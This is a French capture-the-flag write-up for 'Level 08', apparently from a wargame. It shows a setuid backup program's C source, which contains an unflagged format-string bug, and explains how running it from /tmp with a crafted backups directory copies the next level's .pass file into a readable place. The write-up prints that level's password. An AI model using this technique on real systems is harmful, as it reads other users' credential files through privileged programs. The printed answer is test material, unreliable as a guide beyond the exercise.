# Level 08

Voici le code source de ce niveau:

```C
#include <float.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void log_wrapper(FILE *fp, char *msg, char *filepath)
{
    char buff[264];
    size_t buff_len;

    strcpy(buff, msg);
    buff_len = strlen(buff);
    snprintf(&buff[buff_len], 254 - buff_len, filepath);
    buff[strcspn(buff, "\n")] = 0;
    fprintf(fp, "LOG: %s\n", buff);
}

int main(int ac, char **av)
{
    int fd;
    FILE *log_fp;
    FILE *user_fp;
    char buff[104];
    int ascii_c;

    if (ac != 2)
        printf("Usage: %s filename\n", av[0]);
    log_fp = fopen("./backups/.log", "w");
    if (log_fp == NULL)
    {
        printf("ERROR: Failed to open %s\n","./backups/.log");
        exit(1);
    }
    log_wrapper(log_fp, "Starting back up:", av[1]);
    user_fp = fopen(av[1], "r");
    if (user_fp == NULL)
    {
        printf("ERROR: Failed to open %s\n", av[1]);
        exit(1);
    }
    strncpy(buff, "./backups/", 11);
    strncat(buff, av[1], 99 - strlen(buff));
    fd = open(buff, O_WRONLY | O_CREAT | O_EXCL, 0660);
    if (fd < 0)
    {
        printf ("ERROR: Failed to open %s%s\n","./backups/", av[1]);
        exit(1);
    }
    while (true)
    {
        ascii_c = fgetc(user_fp);
        if (ascii_c == -1)
            break;
        write(fd, &ascii_c, 1);
    }
    log_wrapper(log_fp, "Finished back up " ,av[1]);
    fclose(user_fp);
    close(fd);
    return 0;
}
```

L'idee ici est de lire le fichier `.pass` du `level09` pour que le programme puisse ecrire son contenu dans un fichier lisible par `level08`. Nous allons donc nous deplacer dans le dossier `/tmp` ou nous pouvons creer des fichiers et des dossiers:

```bash
cd /tmp
```

Ensuite nous allons creer cette arborescence:

```bash
mkdir -p ./backups/home/users/level09
```

Puis nous avons juste a lancer le programme comme ceci:

```bash
~/level08 /home/users/level09/.pass
cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Le programme va lire en ecriture le fichier passe en argument:

```C
user_fp = fopen(av[1], "r");
```

Ensuite il va ouvrir en ecrite un fichier situe a `./backups/{av[1]}`

```C
strncpy(buff, "./backups/", 11);
strncat(buff, av[1], 99 - strlen(buff));
fd = open(buff, O_WRONLY | O_CREAT | O_EXCL, 0660);
```

Pour finir, le programme va lire le fichier passe en parametres et l'ecrire dans notre `fd`

```C
while (true)
{
    ascii_c = fgetc(user_fp);
    if (ascii_c == -1)
        break;
    write(fd, &ascii_c, 1);
}
```
